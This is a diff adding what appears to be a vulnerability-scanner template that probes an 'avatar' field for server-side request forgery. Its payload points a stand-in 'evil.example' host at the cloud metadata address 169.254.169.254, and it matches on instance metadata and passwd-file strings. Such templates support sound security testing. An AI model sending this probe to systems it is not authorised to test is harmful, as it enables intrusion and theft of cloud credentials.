@@ -1,0 +1,24 @@
+id: ssrf5-0578
+name: 'SSRF probe in avatar'
+severity: high
+type: active
+tags:
+  - ssrf
+  - oob
+  - cloud
+description: 'Fetches internal URL via avatar (verify manually)'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      avatar:
+        - 'http://evil.example@169.254.169.254/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
+          - 'root:x:0:0'
+          - 'PONG'
